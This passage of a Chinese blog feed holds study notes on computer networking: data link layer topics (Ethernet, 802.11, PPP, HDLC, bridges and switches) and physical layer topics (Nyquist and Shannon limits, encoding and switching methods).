<h3 id="局域网的分类"><a href="#局域网的分类" class="headerlink" title="局域网的分类"></a>局域网的分类</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110212243343.png" alt="image-20230110212243343"></p>
<p>wifi是无线局域网的一种应用</p>
<h3 id="IEEE-802标准"><a href="#IEEE-802标准" class="headerlink" title="IEEE 802标准"></a>IEEE 802标准</h3><p>IEEE 802系列标准是IEEE 802 LAN/MAN 标准委员会制定的局域网、城域网技术标准（1980年2月成立）。其中最广泛使用的有以太网、令牌环、无线局域网等。这一系列标准中的每一个子标准都由委员会中的一个专门工作组负责。</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110212819213.png" alt="image-20230110212819213"></p>
<h3 id="MAC子层和LLC子层"><a href="#MAC子层和LLC子层" class="headerlink" title="MAC子层和LLC子层"></a>MAC子层和LLC子层</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110213455480.png" alt="image-20230110213455480"></p>
<h2 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110214227420.png" alt="image-20230110214227420"></p>
<h3 id="以太网提供无连接、不可靠的服务"><a href="#以太网提供无连接、不可靠的服务" class="headerlink" title="以太网提供无连接、不可靠的服务"></a>以太网提供无连接、不可靠的服务</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110214332996.png" alt="image-20230110214332996"></p>
<h3 id="以太网传输介质与拓扑结构的发展"><a href="#以太网传输介质与拓扑结构的发展" class="headerlink" title="以太网传输介质与拓扑结构的发展"></a>以太网传输介质与拓扑结构的发展</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110214631401.png" alt="image-20230110214631401"></p>
<h3 id="10BASE-T以太网"><a href="#10BASE-T以太网" class="headerlink" title="10BASE-T以太网"></a>10BASE-T以太网</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110214840419.png" alt="image-20230110214840419"></p>
<h3 id="适配器与MAC地址"><a href="#适配器与MAC地址" class="headerlink" title="适配器与MAC地址"></a>适配器与MAC地址</h3><p>计算机与外界有局域网的连接是通过<strong>通信适配器</strong><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110215012301.png" alt="image-20230110215012301"><br>在局域网中，硬件地址又称为物理地址，或MAC地址。<br>MAC地址：每个适配器有一个全球唯一的48位二进制地址，前24位代表厂家（由IEEE规定)，后24位厂家自己指定。常用6个十六进制数表示，如02-60-8c-e4-b1-21</p>
<h3 id="以太网MAC帧"><a href="#以太网MAC帧" class="headerlink" title="以太网MAC帧"></a>以太网MAC帧</h3><p>最常用的MAC帧是以太网V2的格式<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110215629965.png" alt="image-20230110215629965"><br>源地址：发送发地址<br>目的地址：接收方地址<br>类型：指明网络层使用协议<br>数据：1500字节是规定，46字节来源于最小帧长64B<br>FCS：CRC检验码</p>
<p>与IEEE 802.3的区别：</p>
<ol>
<li>第三个字段是长度/类型</li>
<li>当长度/类型字段值小于0x0600时，数据字段必须装入LLC子层</li>
</ol>
<h3 id="高速以太网"><a href="#高速以太网" class="headerlink" title="高速以太网"></a>高速以太网</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230110220711030.png" alt="image-20230110220711030"></p>
<h2 id="无线局域网"><a href="#无线局域网" class="headerlink" title="无线局域网"></a>无线局域网</h2><h3 id="802-11的MAC帧头格式"><a href="#802-11的MAC帧头格式" class="headerlink" title="802.11的MAC帧头格式"></a>802.11的MAC帧头格式</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111214301808.png" alt="image-20230111214301808"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111214504496.png" alt="image-20230111214504496"></p>
<h4 id="IBSS"><a href="#IBSS" class="headerlink" title="IBSS"></a>IBSS</h4><p>设备工作在IBSS模式下形成的网络，一般称为Ad Hoc网络。设备可以与通信范围内的所有其他设备形成通信链路。但是，当距离超过了通信范围后，设备在链路层上是无法直接进行数据传输的，除非所有设备在网络层使用了某种路由协议。</p>
<h4 id="BSS-amp-ESS"><a href="#BSS-amp-ESS" class="headerlink" title="BSS&amp;ESS"></a>BSS&amp;ESS</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111215302190.png" alt="image-20230111215302190"></p>
<p>BSS是WiFi最常用的网络结构。AP (Access Point)是BSS网络的创建者和管理者，所有设备与AP建立通信链路。普通设备之间进行通信，是需要AP进行转发的。STA 1要与STA 2进行通信时，经过的链路为STA 1$\rightarrow$AP$\rightarrow$STA2。一个AP和所有与它关联的设备组成一个BSS。多个AP可以设置相同的BSSID，并通过DS (Distribution System)进行连接，此时AP与所有设备形成的网络称为ESS。</p>
<h4 id="WDS"><a href="#WDS" class="headerlink" title="WDS"></a>WDS</h4><p>IEEE 802.11标准没有定义DS的具体实现形式，只要能为提供Portal和Integration功能集的系统都可以成为DS。DS可以是有线的，也可以通过无线系统实现。利用WiFi设备实现的DS，称为WDS (Wireless Distribution System)。在WDS中，WiFi设备利用了IEEE 802.11定义的4 地址帧结构，在链路层实现网络覆盖范围的扩展。但是，WDS是一种非标准模式，IEEE 802.11没有定义WDS的具体实现方式；现有的WDS系统完全依赖与WiFi芯片厂商的解决方案；来自不同厂商的设备在WDS模式下的兼容性很差。</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111215359245.png" alt="image-20230111215359245"></p>
<h4 id="MBSS"><a href="#MBSS" class="headerlink" title="MBSS"></a>MBSS</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111215420363.png" alt="image-20230111215420363"></p>
<p>MBSS是IEEE 802.11s定义的一种网络结构。与IBSS相似，设备可以与临近的其他设备直接进行通信。但是，与IBSS不同，MBSS有链路层的路由协议 (结合了树状路由和AODV)，即使两个设备之间的距离超过了通信范围，它们也是可以通过其他设备的转发实现通信。不同的MBSS也可以通过DS将Mesh Gateway连接起来，形成更大规模的网络。</p>
<h3 id="无线局域网的分类"><a href="#无线局域网的分类" class="headerlink" title="无线局域网的分类"></a>无线局域网的分类</h3><h4 id="有固定基础设施无线局域网"><a href="#有固定基础设施无线局域网" class="headerlink" title="有固定基础设施无线局域网"></a>有固定基础设施无线局域网</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111214629285.png" alt="image-20230111214629285"></p>
<h4 id="无固定基础设施无线局域网的自组织网络"><a href="#无固定基础设施无线局域网的自组织网络" class="headerlink" title="无固定基础设施无线局域网的自组织网络"></a>无固定基础设施无线局域网的自组织网络</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111215834139.png" alt="image-20230111215834139"></p>
<h2 id="广域网"><a href="#广域网" class="headerlink" title="广域网"></a>广域网</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111220018669.png" alt="image-20230111220018669"></p>
<h2 id="PPP协议"><a href="#PPP协议" class="headerlink" title="PPP协议"></a>PPP协议</h2><p>点对点协议PPP是目前使用最广泛的数据链路层协议，用户使用拨号电话接入因特网时一般都是用PPP协议。<br><strong>只支持全双工链路</strong></p>
<h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><ul>
<li>简单    对于链路层的帧，无需纠错，无需序号，无需流量控制</li>
<li>封装成帧    帧定界符</li>
<li>透明传输    与帧定界符一样比特组合的数据的处理方式：异步线路用字节填充，同步线路用比特填充</li>
<li>多种网络层协议    封装的IP数据报可以采用多种协议</li>
<li>多种类型链路    串行/并行，同步/异步，电/光。。。</li>
<li>差错检测    错就丢弃</li>
<li>检测连接状态    链路是否正常工作</li>
<li>最大传送单元    数据部分最大长度MTU</li>
<li>网络层地址协商   知道通信双方的网络层地址</li>
<li>数据压缩协商</li>
</ul>
<h3 id="无需满足的要求"><a href="#无需满足的要求" class="headerlink" title="无需满足的要求"></a>无需满足的要求</h3><ul>
<li>纠错</li>
<li>流量控制</li>
<li>序号</li>
<li>不支持多点线路</li>
</ul>
<h3 id="组成部分"><a href="#组成部分" class="headerlink" title="组成部分"></a>组成部分</h3><ol>
<li>一个将IP数据报封装到串行链路（同步串行/异步串行）的方法</li>
<li>链路控制协议LCP：建立并维护数据链路连接。身份验证</li>
<li>网络控制协议NCP：PPP可支持多种网络层协议，每个不同的网络层协议都要一个相应的NCP来配置，为网络层协议建立和配置逻辑连接。</li>
</ol>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111221238089.png" alt="image-20230111221238089"></p>
<h3 id="PPP协议的帧格式"><a href="#PPP协议的帧格式" class="headerlink" title="PPP协议的帧格式"></a>PPP协议的帧格式</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111221440739.png" alt="image-20230111221440739"></p>
<p><strong>PPP协议是面对字节的协议</strong></p>
<h2 id="HDLC协议"><a href="#HDLC协议" class="headerlink" title="HDLC协议"></a>HDLC协议</h2><p>高级数据链路控制，是一个在同步网上传输数据、面向比特的数据链路层协议，他是由国际标准化组织(ISO)根据IBM公司的SDLC协议扩展开发而成的。</p>
<p>数据报文可透明传输，用于实现透明传输的“0比特插入法”易于硬件实现 </p>
<p>采用全双工通信</p>
<p>所有帧采用<strong>CRC检验</strong>，对信息帧进行顺序<strong>编号</strong>，可防止漏收或重份，传输可靠性高</p>
<h3 id="HDLC的站"><a href="#HDLC的站" class="headerlink" title="HDLC的站"></a>HDLC的站</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111222021405.png" alt="image-20230111222021405"></p>
<h3 id="数据操作方式"><a href="#数据操作方式" class="headerlink" title="数据操作方式"></a>数据操作方式</h3><ol>
<li>正常响应方式：从站进行数据传输时需要经过主站的允许</li>
<li>异步平衡方式：所有站都可以不经过他站的允许就进行数据传输</li>
<li>异步响应方式：从站可以不经过主站允许就进行数据传输</li>
</ol>
<h3 id="HDLC的帧格式"><a href="#HDLC的帧格式" class="headerlink" title="HDLC的帧格式"></a>HDLC的帧格式</h3><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111222437569.png" alt="image-20230111222437569"></p>
<h2 id="PPP协议-amp-HDLC协议"><a href="#PPP协议-amp-HDLC协议" class="headerlink" title="PPP协议&amp;HDLC协议"></a>PPP协议&amp;HDLC协议</h2><p>PPP协议可以实现字节填充也可以比特填充，HDLC协议只能进行比特填充<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230111222613904.png" alt="image-20230111222613904"></p>
<h2 id="链路层设备"><a href="#链路层设备" class="headerlink" title="链路层设备"></a>链路层设备</h2><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230112211130895.png" alt="image-20230112211130895"><br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230112211229605.png" alt="image-20230112211229605"></p>
<h3 id="链路层扩展以太网"><a href="#链路层扩展以太网" class="headerlink" title="链路层扩展以太网"></a>链路层扩展以太网</h3><h4 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a>网桥</h4><p>根据MAC帧的目的地址对帧进行转发和过滤。当网桥收到一个帧时，并不向所有接口转发此帧，而是先检查此帧的目的MAC地址，然后再确定将该帧转发到哪一个接口，或者是把他丢弃（即过滤）。<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230112211627769.png" alt="image-20230112211627769"></p>
<p>网桥优点：</p>
<ol>
<li>过滤通信量，增大吞吐量</li>
<li>扩大了物理范围</li>
<li>提高了可靠性</li>
<li>可互连不同物理层、不同MAC子层和不同速率的以太网</li>
</ol>
<h5 id="透明网桥"><a href="#透明网桥" class="headerlink" title="透明网桥"></a>透明网桥</h5><p>“透明”指以太网上的站点并不知道所发送的帧将经过哪几个网桥，是一种即插即用设备——自学习。<br><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230112212726678.png" alt="image-20230112212726678"></p>
<h5 id="源路由网桥"><a href="#源路由网桥" class="headerlink" title="源路由网桥"></a>源路由网桥</h5><p>在发送帧时，把详细的最佳路由信息（路由最少/时间最短）放在帧的首部中。<br>方法：源站以广播方式向欲通信的目的站发送一个发现帧。</p>
<h4 id="多接口网桥——以太网交换机"><a href="#多接口网桥——以太网交换机" class="headerlink" title="多接口网桥——以太网交换机"></a>多接口网桥——以太网交换机</h4><p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230112213344680.png" alt="image-20230112213344680"></p>
<h5 id="直通式交换机"><a href="#直通式交换机" class="headerlink" title="直通式交换机"></a>直通式交换机</h5><p>查完目的地址(6B)就立刻转发</p>
<p>延迟小，可靠性低，无法支持具有不同速率的端口的交换</p>
<h5 id="存储转发式交换机"><a href="#存储转发式交换机" class="headerlink" title="存储转发式交换机"></a>存储转发式交换机</h5><p>将帧放入告诉缓存，并检查是否正确，正确就转发，错误就丢弃。</p>
<p>延迟大，可靠性高，可以支持具有不同速率的端口的交换</p>
<h3 id="冲突域"><a href="#冲突域" class="headerlink" title="冲突域"></a>冲突域</h3><p>在同一个冲突域中的每一个节点都能收到所有被转发的帧，简单来说就是同一时间内只能有一台设备发送信息的范围。</p>
<h3 id="广播域"><a href="#广播域" class="headerlink" title="广播域"></a>广播域</h3><p>网络中能接收任一设备发出的广播帧的所有设备的集合。简单地说如果站点发出一个广播信号，所有能接收到这个信号的设备范围称为一个广播域。</p>
<p><img src="/2023/01/04/%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230112214111749.png" alt="image-20230112214111749"></p>
<p>链路层设备一个端口就是一个冲突域。l</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计网概念</tag>
      </tags>
  </entry>
  <entry>
    <title>物理层</title>
    <url>/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>计算机网络中物理层相关知识点</p>
<span id="more"></span>
<p>物理层解决如何在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。</p>
<p>物理层主要任务：确定与传输媒体接口有关的一些特性——》定义标准</p>
<h2 id="物理层接口特性"><a href="#物理层接口特性" class="headerlink" title="物理层接口特性"></a>物理层接口特性</h2><ul>
<li>机械特性：定义物理连接的特性，规定物理连接时所采用的规格、接口形状、引线数目、引脚数量和排列情况</li>
<li>电气特性：规定传输二进制位时，线路上信号的电压范围、阻抗匹配、传输速率和距离限制等。</li>
<li>功能特性：指明某条线上出现的某一电平表示何种意义，接口部件的信号线的用途</li>
<li>规程特性：定义各条物理路线的工作规程和时序关系</li>
</ul>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103164153429-16727915428151.png" alt></p>
<p>通信的目的是传送消息（消息：语音、文字、图像、视频）<br>数据data：传送信息的实体，通常是有意义的符号序列<br>信号：数据的电气/电磁的表现，是数据在传输过程中的存在形式</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103164340775-16727925592692.png" alt></p>
<p>信源：产生和发送数据的源头<br>信宿：接受数据的终点<br>信道：信号的传输媒介。一般用来表示向某一个方向发送信息的截止，因此一条通信线路往往包括一条发送信道和一条接收信道<br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103164620835-16727925621933.png" alt></p>
<h2 id="三种通信方式"><a href="#三种通信方式" class="headerlink" title="三种通信方式"></a>三种通信方式</h2><ol>
<li>单工通信：只有一个方向的通信而没有反方向的交互，仅需要一条信道。</li>
<li>半双工通信/双向交替通信：通信的双方都可以发送或接受信息，但任何一方都不能同时发送和接受，需要两条信道</li>
<li>全双工通信/双向同时通信：通信双方可以同时发送和接受信息，也需要两条信道</li>
</ol>
<h2 id="串行传输-amp-并行传输"><a href="#串行传输-amp-并行传输" class="headerlink" title="串行传输&amp;并行传输"></a>串行传输&amp;并行传输</h2><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103165209419-16727925643844.png" alt><br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103165149667-16727925664925.png" alt>常用于计算机内部数据传输</p>
<h2 id="同步传输-amp-异步传输"><a href="#同步传输-amp-异步传输" class="headerlink" title="同步传输&amp;异步传输"></a>同步传输&amp;异步传输</h2><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103165348925-16727925682396.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103165536756-16727925698577.png" alt></p>
<h2 id="码元"><a href="#码元" class="headerlink" title="码元"></a>码元</h2><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103172027101-16727925714588.png" alt></p>
<p>1）码元传输速率：别名码元速率、波形速率、调制速率、符号速率等，单位是波特（Baud），单位时间内数字通信系统所传输的码元个数。码元速率与进制数无关，只与码元长度T有关$R_B=\frac{1}{T}(B)$<br>2）信息传输速率：别名信息速率、比特率等，单位时间内数字通信系统传输的二进制码元个数（即比特数），单位是比特/秒（b/s）</p>
<p>关系：若一个码元携带n bit的信息量，则M Baud的码元传输速率所对应的信息传输速率为M×n bit/s</p>
<p>例题：<br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103173331778-16727925738079.png" alt></p>
<h2 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h2><p>1.模拟信号系统中：当输入的信号频率高或低到一定程度，使得系统的输出功率成为输入功率的一半时，最高频率和最低频率间的差值就代表了系统的通频带宽，其单位为赫兹(Hz)</p>
<p>2.数字设备中：表示在单位时间内从网络中某一点到另一点所能通过的<strong>最高数据率</strong>/单位时间内通过链路的数量，常用来表示网络的通信线路所能传输数据的能力。单位是比特每秒(b/s)</p>
<h2 id="奈氏准则（奈奎斯特定理）"><a href="#奈氏准则（奈奎斯特定理）" class="headerlink" title="奈氏准则（奈奎斯特定理）"></a>奈氏准则（奈奎斯特定理）</h2><p>影响失真程度的因素：1.码元传输速率 2.信号传输距离 3.噪声干扰 4.传输媒体质量</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103174800334-167279257601610.png" alt></p>
<p>奈氏准则：在理想低通（无噪声，带宽受限）条件下，为了避免码间串扰，极限码元传输速率为2W Baud，W是信道带宽，单位是Hz。</p>
<p>理想低通信道下的极限数据传输率=$2Wlog_2V(b/s)$，W：带宽(Hz)  V：几种码元/码元的离散电平数目</p>
<ol>
<li>在任何信道中，<strong>码元传输的速率是有上限的</strong>。若传输速率超过此上限，就会出现严重的码间串扰问题，使接收端对码元的完全正确识别成为不可能。</li>
<li>信道的频带越宽（即能通过的信号高频分量越多），就可以用更高的速率进行码元的有效传输。</li>
<li>奈氏准则给出了码元传输速率的限制，但并没有对信息传输速率给出限制</li>
<li>由于码元的传输速率受奈氏准则的制约，所以要提高数据的传输速率，就必须设法使每个码元能携带更多个比特的信息量，这就需要采用多元制的调制方法.</li>
</ol>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103182302698-167279257777511.png" alt></p>
<h2 id="香农定理"><a href="#香农定理" class="headerlink" title="香农定理"></a>香农定理</h2><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103182430898-167279257958412.png" alt></p>
<p>信噪比=信号的平均功率/噪声的平均功率，常记为S/N，并用分贝(dB)作为度量单位，即：</p>
<p>$信噪比(dB)=10log_{10}(S/N)$</p>
<p>在带宽受限且有噪声的信道中，为了不产生误差，信息的数据传输速率有上限值。</p>
<script type="math/tex; mode=display">
信道的极限数据传输速率=Wlog_2(1+S/N) (b/s)</script><p>推论<br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103183154787-167279258112513.png" alt></p>
<h3 id="奈氏准则和香农定理"><a href="#奈氏准则和香农定理" class="headerlink" title="奈氏准则和香农定理"></a>奈氏准则和香农定理</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103183623766-167279258272014.png" alt></p>
<h2 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h2><h3 id="基带信号与宽带信号"><a href="#基带信号与宽带信号" class="headerlink" title="基带信号与宽带信号"></a>基带信号与宽带信号</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103184846447-167279258414615.png" alt></p>
<p> <img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103185303037-167279258568616.png" alt></p>
<h3 id="数字数据编码为数字信号"><a href="#数字数据编码为数字信号" class="headerlink" title="数字数据编码为数字信号"></a>数字数据编码为数字信号</h3><p>1.非归零编码【NRZ】    2.曼切斯特编码    3.差分曼切斯特编码    4.归零编码【RZ】    5.反向不归零编码【NRZI】    6.4B/5B编码 </p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103190048155-167279258749817.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103190116678-167279258884018.png" alt>编码：10011010<img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103190143154-167279259042619.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103190230580-167279259223120.png" alt>编码：10011010<img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103190246207-167279259347221.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103191801785-167279259538422.png" alt><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103192125822-167279259694523.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103192208870-167279259863824.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103192521027-167279260275625.png" alt><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103192445031-167279260467126.png" alt></p>
<h3 id="数字数据调制为模拟信号"><a href="#数字数据调制为模拟信号" class="headerlink" title="数字数据调制为模拟信号"></a>数字数据调制为模拟信号</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103192754829-167279260696627.png" alt></p>
<h3 id="模拟数据编码为数字信号"><a href="#模拟数据编码为数字信号" class="headerlink" title="模拟数据编码为数字信号"></a>模拟数据编码为数字信号</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103193529027-167279261051728.png" alt></p>
<ol>
<li><p>抽样</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103193649691-167279261262129.png" alt></p>
</li>
<li><p>量化</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103193712185-167279261420230.png" alt></p>
</li>
<li><p>编码</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103193746901-167279261633531.png" alt></p>
</li>
</ol>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103193851839-167279261751432.png" alt></p>
<h3 id="模拟数据调制为模拟信号"><a href="#模拟数据调制为模拟信号" class="headerlink" title="模拟数据调制为模拟信号"></a>模拟数据调制为模拟信号</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103194601850-167279261920833.png" alt></p>
<h2 id="数据交换方式"><a href="#数据交换方式" class="headerlink" title="数据交换方式"></a>数据交换方式</h2><h3 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h3><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103195427418-167279262085434.png" alt><br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103195617523-167279262199435.png" alt></p>
<p>特点：独占资源，用户始终占用端对端的固定传输带宽，适用于远程批处理信息传输或系统间实时性要求高的大量数据传输的情况</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103195959354-167279262392236.png" alt></p>
<h3 id="报文交换"><a href="#报文交换" class="headerlink" title="报文交换"></a>报文交换</h3><p>报文：网络中交换与传输的数据单元，即站点一次性要发送的数据块。报文包含了将要发送的完整的数据信息，其长短很不一致，长度不限且可变。</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103200303274-167279262636437.png" alt><br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103200520863-167279262796638.png" alt></p>
<p>优点：<img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103200620703-167279262981139.png" style="zoom: 80%;"></p>
<p>缺点：<img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103200647901-167279263147840.png" style="zoom:80%;"></p>
<h3 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h3><p>分组：大多数计算机网络都不能连续的传送任意长数据，所以实际上网络系统把数据分割成小块，然后逐块的发送，这种小块就称作分组<br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103200957655-167279263306641.png" alt><br><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103201033840-167279263439242.png" alt></p>
<p>优点：<img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103201320054-167279263603943.png" style="zoom:80%;"></p>
<p>缺点：<img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103201237096-167279263757844.png" style="zoom:80%;"></p>
<h4 id="数据报方式"><a href="#数据报方式" class="headerlink" title="数据报方式"></a>数据报方式</h4><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103201820163-167279263917245.png" alt></p>
<p>无连接服务：不事先为分组的传输确定传输路径，每个分组独立确定传输路径，不同分组传输路径可能不同。</p>
<p>特点</p>
<ol>
<li>数据报方式为网络层提供无连接服务。发送方可随时发送分组，网络中的结点可随时接受分组。</li>
<li>同一报文的不同分组达到目的结点时可能发生乱序、重复与丢失。</li>
<li>每个分组在传输过程中都必须携带源地址和目的地址，以及分组号。</li>
<li>分组在交换结点存储转发时，需要排队等候处理，这会带来一定时延，当通过交换结点的通信量较大或网络发生拥塞时，这种时延会大大增加，交换结点还可根据情况丢弃部分分组。</li>
<li>网络具有冗余路径，当某一交换结点或一段链路出现故障时，可相应地更新转发表，寻找另一条路径转发分组，对故障适应能力强，适用于突发性通信，不适用于长报文、会话式通信。</li>
</ol>
<h4 id="虚电路方式"><a href="#虚电路方式" class="headerlink" title="虚电路方式"></a>虚电路方式</h4><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103203057644-167279264105646.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103203209520-167279264267547.png" alt></p>
<p>连接服务：首先为分组的传输确定传输路径（建立连接），然后沿该路径（连接）传输系列分组，系列分组传输路径相同，传输结束后拆除连接‘</p>
<p>特点</p>
<ol>
<li>虚电路方式为网络层提供连接服务。源结点与目的结点之间建立一条逻辑连接，而非实际物理连接。</li>
<li>一次通信的所有分组都通过虚电路顺序传送，分组不需携带源地址、目的地址等信息，包含虚电路号，相对数据报方式开销小，同一报文的不同分组到达目的结点时不会乱序、重复或丢失</li>
<li>分组通过虚电路上的每个结点时，结点只进行差错检测，不需进行路由选择。</li>
<li>每个结点可能与多个结点之间建立多条虚电路，每条虚电路支持特定的两个端系统之间的数据传输，可以对两个数据端点的流量进行控制，两个端系统之间也可以有多条虚电路为不同的进程服务</li>
<li>致命弱点：当网络中某个结点或某个链路出故障而彻底失效时，所有经过该结点或该链路的虚电路将遭到破坏。</li>
</ol>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103204131257-167279264450448.png" alt></p>
<h2 id="数据交换方式的选择"><a href="#数据交换方式的选择" class="headerlink" title="数据交换方式的选择"></a>数据交换方式的选择</h2><p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103201454934-167279264604849.png" alt></p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103201550842-167279264788350.png" style="zoom:80%;"></p>
<h2 id="物理层传输介质"><a href="#物理层传输介质" class="headerlink" title="物理层传输介质"></a>物理层传输介质</h2><p>数据传输系统中在发送设备和接受设备之间的物理通路，传输介质也称传输媒体/传输媒介<br>传输媒体并不是物理层</p>
<p><img src="/2023/01/02/%E7%89%A9%E7%90%86%E5%B1%82/image-20230103204641991-167279264968351.png" alt></p>
